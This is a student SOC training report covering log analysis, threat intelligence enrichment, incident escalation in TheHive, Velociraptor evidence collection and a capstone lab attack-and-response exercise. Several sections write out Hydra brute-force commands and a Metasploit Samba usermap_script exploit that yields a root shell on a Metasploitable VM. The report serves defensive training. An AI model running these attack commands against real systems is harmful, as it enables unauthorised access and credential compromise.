# 🛡️ SOC Week 3 — Security Operations Center Project Report

> **Organization:** CYART | **Program:** SOC Analyst Training  
> **Week:** 3 | **Theme:** Advanced Detection, Threat Intelligence & Incident Response

---

## 📋 Table of Contents

- [Project Overview](#-project-overview)
- [Objectives](#-objectives)
- [Lab Environment](#-lab-environment)
- [Tools Used](#-tools-used)
- [Task 1 — Advanced Log Analysis](#-task-1--advanced-log-analysis)
- [Task 2 — Threat Intelligence Integration](#-task-2--threat-intelligence-integration)
- [Task 3 — Incident Escalation Workflows](#-task-3--incident-escalation-workflows)
- [Task 4 — Alert Triage with Threat Intelligence](#-task-4--alert-triage-with-threat-intelligence)
- [Task 5 — Evidence Preservation and Analysis](#-task-5--evidence-preservation-and-analysis)
- [Task 6 — Capstone: Full SOC Workflow Simulation](#-task-6--capstone-full-soc-workflow-simulation)
- [SOC Workflow Summary](#-soc-workflow-summary)
- [Challenges](#-challenges)
- [Key Learnings](#-key-learnings)
- [Recommendations](#-recommendations)
- [Conclusion](#-conclusion)
- [Author](#-author)

---

## 📌 Project Overview

This report documents Week 3 of the SOC Analyst training program. It covers six tasks spanning both **theoretical knowledge** and **practical lab exercises**. The work focuses on:

- Advanced log analysis and anomaly detection
- Threat intelligence integration using AlienVault OTX and VirusTotal
- Incident escalation through SOC tiers
- Alert triage and IOC validation
- Digital evidence preservation using Velociraptor
- A full end-to-end SOC workflow simulation using Metasploit, Wazuh, Elastic Stack, and TheHive

---

## 🎯 Objectives

- Understand and apply log correlation and anomaly detection techniques
- Integrate threat intelligence feeds into SIEM platforms (Wazuh, Elastic Stack)
- Simulate real-world brute-force and exploitation attacks in a controlled lab
- Escalate incidents through SOC tiers using structured workflows
- Perform alert triage and validate Indicators of Compromise (IOCs)
- Preserve digital evidence following chain-of-custody procedures
- Map observed attack behaviours to the **MITRE ATT&CK** framework

---

## 🖥️ Lab Environment

| System | Role | IP Address |
|--------|------|------------|
| Kali Linux | Attacker Machine | 192.168.56.3 |
| Metasploitable2 | Victim / Target | 192.168.56.5 / 192.168.56.6 |
| Ubuntu | SOC / Log Monitoring Server | 192.168.56.4 |
| Windows 10 | Evidence Collection Host | Local VM |

> All machines were configured on a **Host-Only Network (192.168.56.0/24)** using Oracle VirtualBox.

---

## 🔧 Tools Used

| Category | Tools |
|----------|-------|
| Attack Simulation | Nmap, Hydra, Metasploit Framework |
| SIEM & Log Analysis | Elastic Stack (Elasticsearch, Kibana, Filebeat), Wazuh |
| Threat Intelligence | AlienVault OTX, VirusTotal |
| Incident Management | TheHive 5 |
| Evidence Collection | Velociraptor |
| Log Forwarding | rsyslog, tcpdump |
| Scripting & Commands | grep, awk, sort, uniq, certutil, iptables, ufw |

---

## 📁 Task 1 — Advanced Log Analysis

### Theory

**Advanced log analysis** is the process of collecting and correlating logs from multiple sources to detect suspicious activities. It helps identify attack patterns such as brute-force attempts and reduces false positives by enriching log data with contextual information.

**Key Concepts:**
- **Log Correlation** — Linking related events across sources by IP, username, and timestamp
- **Anomaly Detection** — Identifying deviations from normal behaviour (e.g. repeated login failures)
- **Log Enrichment** — Adding context such as IP reputation, user role, and risk level
- **Log Flow** — `User Login Attempt → SSH Service → auth.log → Extraction → Correlation → Detection`

---

### Practical — Theoretical Lab (SSH Brute-Force via `auth.log`)

**Steps Performed:**

1. Started the SSH service and verified it was listening on port 22
2. Simulated failed SSH login attempts using invalid credentials for user `fakeuser`
3. Extracted failed login events from the auth log

```bash
grep "Failed password" /var/log/auth.log
```

4. Identified the source IP using `awk`

```bash
sudo grep "Failed password" /var/log/auth.log | awk '{print $11}'
```

5. Counted attempts per IP using `sort` and `uniq`

```bash
sudo grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c
```

**Findings:**

| Field | Value |
|-------|-------|
| Target User | `fakeuser` |
| Source IP | `127.0.0.1` |
| Total Failed Attempts | 3 |
| Pattern | Repeated attempts within a short interval |
| Risk Level | Medium |
| Classification | Potential Brute-Force Attack |

---

### Practical — Advanced Lab (Elastic Stack + Kibana)

**Lab Setup:**

| Component | Detail |
|-----------|--------|
| Attacker | Kali Linux — 192.168.56.3 |
| Victim | Metasploitable — 192.168.56.6 |
| SIEM | Elastic Stack (Elasticsearch + Kibana + Filebeat) |

**Steps Performed:**

1. Configured network connectivity between Kali and Metasploitable using `ping`
2. Enabled remote logging on Metasploitable using `rsyslog`
3. Configured Filebeat on Kali to ingest logs into Elasticsearch
4. Verified log forwarding with `tcpdump` on port 514
5. Simulated a brute-force attack targeting FTP

```bash
hydra -l msfadmin -P small.txt ftp://192.168.56.6
```

6. Queried authentication failure events in Kibana

```
authentication failure
failed
```

**Log Correlation Table:**

| Timestamp | Event Type | Source IP | Destination IP | Notes |
|-----------|------------|-----------|----------------|-------|
| 2026-04-01 20:42:17 | FTP Authentication Fail | 192.168.56.3 | 192.168.56.6 | Brute-force attempt detected |
| 2026-04-01 20:43:30 | SSH Failed Login | 192.168.56.3 | 192.168.56.6 | Multiple login failures |

**Anomaly Detection Rule Defined:**

| Field | Value |
|-------|-------|
| Rule Name | Brute Force Detection |
| Condition | Event contains `authentication failure` |
| Threshold | More than 10 failures in 1 minute |
| Action | Generate alert |

**Conclusion:** Centralized log collection and anomaly detection using Elastic Security successfully identified brute-force activity. Log correlation and GeoIP enrichment provide deeper investigative context in real-world deployments.

---

## 📁 Task 2 — Threat Intelligence Integration

### Theory

**Threat Intelligence Integration** enables SOC analysts to enrich security alerts with external data, validate Indicators of Compromise (IOCs), and map incidents to known threat actor techniques. It is a critical component of modern Security Operations Centers.

**Key Platforms:**
- **VirusTotal** — Validates IP addresses, files, and URLs against multiple security vendor databases
- **AlienVault OTX** — Provides community-sourced threat intelligence including passive DNS, historical data, and pulse feeds
- **MITRE ATT&CK** — A framework for mapping observed behaviour to known adversary techniques

---

### Practical — Theoretical Lab (Manual Threat Intelligence)

**Lab Setup:**

| Component | Detail |
|-----------|--------|
| Attacker | Kali Linux — 192.168.56.3 |
| Victim | Metasploitable — 192.168.56.5 |
| Monitor | Ubuntu — 192.168.56.4 |

**Attack Simulation:**

1. Performed Nmap scan to identify open ports on the victim

```bash
nmap -sS 192.168.56.5
```

2. Found SSH (port 22) open — executed Hydra brute-force attack

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.4 -t 4
```

3. Monitored authentication logs on Ubuntu

```bash
sudo tail -f /var/log/auth.log
```

4. Extracted attacker IP from logs

```bash
sudo grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c
```

**Threat Intelligence Findings:**

| Platform | Finding |
|----------|---------|
| VirusTotal | Attacker IP flagged by at least one security vendor; community score and historical data available |
| AlienVault OTX | Passive DNS records observed; historical activity and indicator metadata available |

**MITRE ATT&CK Mapping:**

| Field | Value |
|-------|-------|
| Technique ID | T1110 |
| Technique Name | Brute Force |
| Tactic | Credential Access |

---

### Practical — Advanced Lab (Wazuh + AlienVault OTX Integration)

**Steps Performed:**

1. Generated an API key from AlienVault OTX
2. Integrated the API key into the Wazuh configuration file

```bash
sudo nano /var/ossec/etc/ossec.conf
```

3. Verified that Wazuh Manager and Indexer services were running

```bash
sudo systemctl status wazuh-manager
sudo systemctl status wazuh-indexer
sudo systemctl status wazuh-dashboard
```

4. Simulated a brute-force attack by injecting fake log entries

```bash
sudo bash -c 'echo "Failed password for invalid user admin from 192.168.1.100 port 22" >> /var/log/auth.log'
```

5. Simulated fake user SSH login to trigger authentication failure

```bash
ssh fakeuser@localhost
```

6. Queried Wazuh Dashboard for failed password alerts and fake user activity

**Alert Enrichment Table:**

| Alert ID | IP Address | Reputation | Notes |
|----------|------------|------------|-------|
| 003 | 192.168.1.100 | Malicious (OTX) | Simulated brute-force attack |

**Threat Hunting (MITRE T1078 — Valid Accounts):**

Executed the following query in Wazuh to hunt for valid account misuse:

```
NOT user.name: system
```

Found 391 authentication events involving accounts such as `root` and `sudeep`, indicating potential credential misuse.

**Privilege Escalation Detection:**

Identified `sudo su` commands executed repeatedly, triggering Wazuh rule for privilege escalation (MITRE T1548).

**Conclusion:** Integrating AlienVault OTX with Wazuh significantly enhanced detection capabilities. The system successfully identified malicious activities, enriched alerts, and detected brute-force and valid account misuse patterns.

---

## 📁 Task 3 — Incident Escalation Workflows

### Theory

**Incident Escalation Workflows** define the structured process by which a SOC team detects, analyses, and escalates a security incident through tiers based on severity and complexity.

**SOC Tiers:**

| Tier | Role | Responsibility |
|------|------|----------------|
| Tier 1 | Triage Analyst | Monitor alerts, classify events, initial investigation |
| Tier 2 | Investigator | Deep analysis, confirm attack, recommend response |
| Tier 3 | Responder | Containment, remediation, policy updates |

**SOAR Automation Logic Example:**
```
IF failed login attempts > 10
THEN:
  - Generate alert
  - Assign to Tier 2
  - Block IP automatically
```

---

### Practical — Theoretical Lab (SSH Brute-Force Escalation)

**Lab Setup:**

| Component | Detail |
|-----------|--------|
| Attacker | Kali Linux |
| Victim | Ubuntu |
| Attack Tool | Hydra |
| Detection | `/var/log/auth.log` |

**Attack Commands:**

```bash
ip a
nmap -sS 192.168.56.4
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.4 -t 4
```

**Log Observations (Ubuntu):**

```
Failed password for invalid user
authentication failure
maximum authentication attempts exceeded
```

**Tier-wise Actions:**

| Tier | Action Taken |
|------|-------------|
| Tier 1 | Monitored `auth.log`, identified repeated failures, classified as brute-force |
| Tier 2 | Analysed logs in depth, verified attacker IP and pattern, confirmed attack |
| Tier 3 | Blocked attacker IP via firewall |

**Containment Command:**

```bash
sudo ufw deny from 192.168.56.3
```

**SITREP (Situation Report):**

| Field | Detail |
|-------|--------|
| Incident | SSH Brute Force Attack |
| Date | 01 April 2026 |
| Detected By | Tier 1 Analyst |
| Attacker IP | 192.168.56.3 |
| Target IP | 192.168.56.4 |
| Action Taken | Escalated to Tier 2, logs analysed, source IP blocked via firewall |
| Status | **Incident Contained Successfully** |

---

### Practical — Advanced Lab (TheHive Incident Management)

**Steps Performed:**

1. Installed TheHive 5 using Docker

```bash
sudo docker run -d -p 9000:9000 --name thehive strangebee/thehive:5
```

2. Created a high-priority incident case titled **"Unauthorized Access - Server-Y"**
3. Added observable: IP `192.168.1.200` tagged with MITRE Technique `T1078`
4. Escalated the case from Tier 1 Analyst to Tier 2 Analyst with a detailed summary
5. Drafted a SITREP within the case comments

**Case Details:**

| Field | Value |
|-------|-------|
| Title | Unauthorized Access - Server-Y |
| Detection Time | 2025-08-18 13:00 |
| Severity | High |
| TLP | Amber |
| IP Address | 192.168.1.200 |
| MITRE Technique | T1078 — Valid Accounts |
| Status | Under Investigation by Tier 2 |

6. Simulated a SOAR playbook workflow:

```
[Alert Generated]
     ↓
[Check Severity]
     ↓
[Is Severity = High?]
    / \
  Yes   No
   ↓     ↓
[Assign Tier 2] [Assign Tier 1]
     ↓
[Notify Analyst]
```

**Conclusion:** TheHive enabled structured case management and cross-tier escalation. The simulated SOAR playbook demonstrated how automation reduces response time in SOC operations.

---

## 📁 Task 4 — Alert Triage with Threat Intelligence

### Theory

**Alert Triage** is the process of reviewing, prioritising, and classifying security alerts to determine their severity and required response. Combining triage with threat intelligence allows analysts to validate IOCs and distinguish true positives from false positives.

**Key Steps in Alert Triage:**
1. Receive alert from SIEM
2. Analyse the alert context (source IP, username, command)
3. Validate IOCs using VirusTotal / AlienVault OTX
4. Classify severity and assign priority
5. Escalate or close the alert

---

### Practical Lab

**Environment:**

| Field | Value |
|-------|-------|
| Platform | Ubuntu (VirtualBox) |
| SIEM | Wazuh |
| Network | NAT + Host-Only |
| Target IP | 192.168.56.9 |

**Steps Performed:**

**Step 1: Verified network and Wazuh service status**

```bash
ip a
sudo systemctl status wazuh-manager
```

**Step 2: Simulated privilege escalation attack**

```bash
sudo su
# Repeated multiple times to generate log events
```

**Step 3: Analysed authentication logs**

```bash
sudo tail -n 20 /var/log/auth.log
```

**Step 4: Detected alerts in Wazuh Dashboard**

Wazuh successfully generated alerts for privilege escalation, tagging the behaviour with MITRE ATT&CK techniques for Persistence, Defense Evasion, and Privilege Escalation.

**Alert Triage Table:**

| Alert ID | Description | Source IP | Priority | Status |
|----------|-------------|-----------|----------|--------|
| 004 | Privilege Escalation via sudo detected | 192.168.56.9 | High | Open |

**Step 5: IOC Validation**

| Platform | Result |
|----------|--------|
| VirusTotal | 2/95 vendors flagged the URL as malicious; IP `127.0.0.1` classified as private |
| AlienVault OTX | No results found for `192.168.56.9` — internal private IP not in threat feeds |

**Key Finding:** While external threat intelligence did not flag the internal IP, **Wazuh's host-based monitoring detected suspicious behaviour internally** — demonstrating the importance of combining internal SIEM alerts with external intelligence rather than relying solely on either source.

**Conclusion:** Alert triage confirmed privilege escalation activity. This task highlights that internal monitoring is essential for threats that external intelligence sources cannot detect.

---

## 📁 Task 5 — Evidence Preservation and Analysis

### Theory

**Evidence Preservation** in digital forensics ensures that collected data maintains its integrity and can be used in legal or investigative proceedings. Key principles include:

- **Volatile data first** — Collect data that changes quickly (RAM, active connections) before non-volatile data
- **Chain of custody** — Document who collected what, when, and how
- **Hash verification** — Use cryptographic hashes (SHA256) to prove evidence has not been tampered with

**Evidence Collection Order:**
```
Network Connections → Running Processes → Memory → Disk Artefacts
```

---

### Practical Lab

**Tools Used:**

| Tool | Purpose |
|------|---------|
| Velociraptor | DFIR endpoint monitoring and evidence collection |
| Windows Command Prompt | Running Velociraptor and certutil |
| certutil | Generating SHA256 hash for integrity verification |

**Steps Performed:**

**Step 1: Launched Velociraptor on Windows 10**

```cmd
.\velociraptor.exe gui
```

**Step 2: Created a notebook for network investigation titled "Netstat Investigation"**

**Step 3: Executed VQL query to collect active network connections**

```sql
SELECT * FROM netstat()
```

Results included connections with states:
- `LISTEN` — ports awaiting connections
- `ESTABLISHED` — active connections in progress

**Step 4: Exported collected data as CSV for further analysis**

**Step 5: Collected memory artefacts using the artifact:**

```
Windows.Memory.ProcessDump
```

This produced the memory dump file: `668_winlogon.exe.dmp`

**Step 6: Generated SHA256 hash for integrity verification**

```cmd
certutil -hashfile 668_winlogon.exe.dmp SHA256
```

**Generated Hash:**
```
8163078ced03ae846f0c6a39c497ac1b2d65a148b2d8888ed1668ccaf0e51357
```

**Evidence Table:**

| Item | Description | Collected By | Date | Hash Value |
|------|-------------|--------------|------|------------|
| Memory Dump | `668_winlogon.exe.dmp` — Server-Y Dump | SOC Analyst | 2026-03-29 | `8163078ced03ae846f0c6a39c497ac1b2d65a148b2d8888ed1668ccaf0e51357` |
| Network CSV | Volatile network connections from `netstat()` | SOC Analyst | 2026-03-29 | N/A |

**Chain of Custody:**
- Evidence collected using Velociraptor in a controlled environment
- Integrity verified using SHA256 hashing via `certutil`
- All files stored in `C:\Users\Sudeep\Downloads` with no modifications post-acquisition

**Conclusion:** This task demonstrated proper volatile data collection and memory artefact acquisition. The SHA256 hash confirms evidence integrity, aligning with standard digital forensic procedures.

---

## 📁 Task 6 — Capstone: Full SOC Workflow Simulation

### Overview

This capstone task simulates a complete, real-world SOC workflow from initial attack through detection, containment, and incident escalation. All previous skills were combined into a single end-to-end exercise.

---

### Lab Environment

| System | Role | IP Address |
|--------|------|------------|
| Kali Linux | Attacker | 192.168.56.3 |
| Metasploitable2 | Victim | 192.168.56.6 |
| Ubuntu | SOC Server | 192.168.56.4 |

---

### Phase 1 — Reconnaissance (Nmap Scan)

```bash
nmap 192.168.56.6
```

**Findings:** FTP, SSH, HTTP, SMB ports open. **Samba service identified as vulnerable.**

---

### Phase 2 — Target Preparation

Services started on Metasploitable to enable exploitation:

```bash
sudo /etc/init.d/samba start
sudo /etc/init.d/proftpd start
```

---

### Phase 3 — Attack Simulation (Metasploit — Samba Exploit)

```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOST 192.168.56.6
set LHOST 192.168.56.3
run
```

**Result:** Reverse shell session opened. **Root access successfully obtained.**

Verified with:
```bash
whoami   # → root
uname -a # → Linux metasploitable 2.6.24-16-server
```

---

### Phase 4 — Log Forwarding Configuration

Configured Metasploitable to forward logs to Ubuntu SOC server via rsyslog:

```bash
echo "*.* @192.168.56.4" | sudo tee -a /etc/syslog.conf
sudo killall syslogd
sudo /sbin/syslogd -r
logger "SOC WORKING FINAL"
```

---

### Phase 5 — Detection & Log Analysis (Ubuntu)

```bash
sudo tail -f /var/log/syslog | grep SOC
```

**Detected Alert Indicators:**

```
ALERT: Samba exploit attempt from 192.168.56.3
ALERT: Unauthorized access detected
ALERT: Privilege escalation to root
```

---

### Phase 6 — Response & Containment

Blocked attacker IP using iptables firewall rule:

```bash
sudo iptables -A INPUT -s 192.168.56.3 -j DROP
```

**Verification:** Ping from Kali to Ubuntu showed **100% packet loss** — attack successfully contained.

---

### Phase 7 — Incident Escalation (TheHive)

Created a formal incident case in TheHive:

**Case Details:**

| Field | Value |
|-------|-------|
| Title | Unauthorized Access via Samba Exploit |
| Severity | High |
| TLP | Amber |
| Attacker IP | 192.168.56.3 |
| Victim IP | 192.168.56.6 |
| Exploit Used | `exploit/multi/samba/usermap_script` |
| MITRE Technique | T1210 — Exploitation of Remote Services |

**Observables Added:**

| Observable | Type | Tags |
|------------|------|------|
| 192.168.56.3 | IP | attacker, kali |
| 192.168.56.6 | IP | victim, metasploitable |
| samba usermap_script exploit | Other | exploit, samba, T1210 |
| Unauthorized access detected | Other | alert, wazuh, logs |
| Privilege escalation to root | Other | alert, wazuh, logs |

---

### Incident Timeline

| Time | Event |
|------|-------|
| 15:25 | Nmap reconnaissance scan executed |
| 15:28 | Samba exploit launched via Metasploit |
| 15:29 | **Root access gained on Metasploitable** |
| 15:55 | Logs detected on Ubuntu SOC server |
| 15:57 | Alert indicators generated in syslog |
| 16:00 | **Attacker IP blocked via iptables** |

---

### Manager Briefing

> A simulated cyber attack was successfully executed and detected within the lab environment. The attacker exploited a Samba vulnerability to gain unauthorised root access. Monitoring systems detected suspicious activity including unauthorised access and privilege escalation. Immediate response blocked the attacker's IP, preventing further compromise. The incident was escalated through the case management platform, demonstrating the organisation's capability to detect, respond, and contain cyber threats effectively.

---

## 🔄 SOC Workflow Summary

```
[Attack Initiated]
       ↓
[Log Generation — auth.log / syslog]
       ↓
[Log Collection — Filebeat / rsyslog → Elasticsearch / Wazuh]
       ↓
[Detection — Kibana / Wazuh Dashboard Alerts]
       ↓
[Tier 1 Triage — Classify & Escalate]
       ↓
[Tier 2 Investigation — Confirm Attack & Recommend Response]
       ↓
[Tier 3 Response — Block IP / Patch / Isolate]
       ↓
[Incident Documentation — TheHive Case + SITREP]
       ↓
[Evidence Preservation — Velociraptor + Hash Verification]
       ↓
[Threat Intelligence Enrichment — VirusTotal / OTX]
       ↓
[MITRE ATT&CK Mapping → Lessons Learned]
```

---

## ⚠️ Challenges

| Task | Challenge Faced |
|------|----------------|
| Task 1 | Differentiating normal SSH activity from malicious login attempts |
| Task 2 | Identifying suitable public IPs for threat intelligence demonstration (internal IPs not indexed) |
| Task 2 | Handling Hydra connection errors during brute-force execution |
| Task 3 | Initial setup of TheHive 5 in Kali Linux environment |
| Task 3 | Managing user roles and permissions within TheHive |
| Task 4 | Understanding that internal IPs yield no results on external TI platforms |
| Task 5 | Velociraptor not initially recognised as an external command — required correct path execution |
| Task 6 | Configuring rsyslog forwarding between Metasploitable and Ubuntu |

---

## 💡 Key Learnings

- **Log correlation** across IP, username, and timestamp is essential for identifying brute-force patterns
- **Centralised log management** (Elastic Stack / Wazuh) is far more effective than analysing individual system logs
- **Threat intelligence platforms** like OTX and VirusTotal validate external IOCs but cannot detect threats from internal IP ranges — **host-based monitoring fills this gap**
- **MITRE ATT&CK mapping** standardises incident analysis and improves SOC response consistency
- **TheHive** provides a structured workflow for cross-tier escalation and case documentation
- **Evidence integrity** must be maintained from the moment of collection using SHA256 hashing and proper chain of custody
- **SOAR automation** can dramatically reduce mean time to respond (MTTR) by automating alert triage and IP blocking
- A **full SOC workflow** requires integrating multiple tools: SIEM, TI platforms, case management, and forensic tools working together

---

## ✅ Recommendations

| Priority | Recommendation |
|----------|---------------|
| 🔴 High | Patch all vulnerable services immediately — especially Samba on legacy systems |
| 🔴 High | Disable password-based SSH login; enforce key-based authentication only |
| 🔴 High | Implement account lockout policies after a defined number of failed login attempts |
| 🟡 Medium | Deploy an IDS/IPS (e.g. Snort, Suricata) for real-time network threat detection |
| 🟡 Medium | Enable GeoIP enrichment in Elastic Stack for attacker geolocation tracking |
| 🟡 Medium | Automate alert triage and IP blocking using a SOAR platform (e.g. Splunk Phantom) |
| 🟢 Low | Conduct regular vulnerability scans across all systems in the environment |
| 🟢 Low | Establish a formal evidence preservation and chain-of-custody procedure for all incidents |

---

## 🏁 Conclusion

This week's tasks provided comprehensive, hands-on experience across the full spectrum of SOC operations. Beginning with foundational log analysis and progressing through threat intelligence integration, structured incident escalation, alert triage, digital forensics, and a complete capstone simulation — each task built on the previous to develop a well-rounded understanding of how a modern Security Operations Centre functions.

The practical exercises confirmed that effective cybersecurity monitoring requires not just the right tools, but the right processes — from initial detection through evidence preservation and final incident closure. The integration of SIEM platforms, threat intelligence feeds, case management systems, and forensic tools demonstrated the layered defence approach central to any mature SOC environment.

---

## 👤 Author

| Field | Detail |
|-------|--------|
| **Name** | Sudeep |
| **Program** | SOC Analyst Internship — CYART |
| **Week** | Week 3 |


---

> *This report was produced as part of the CYART SOC Analyst Training Program. All attack simulations were conducted in a controlled, isolated lab environment for educational purposes only.*
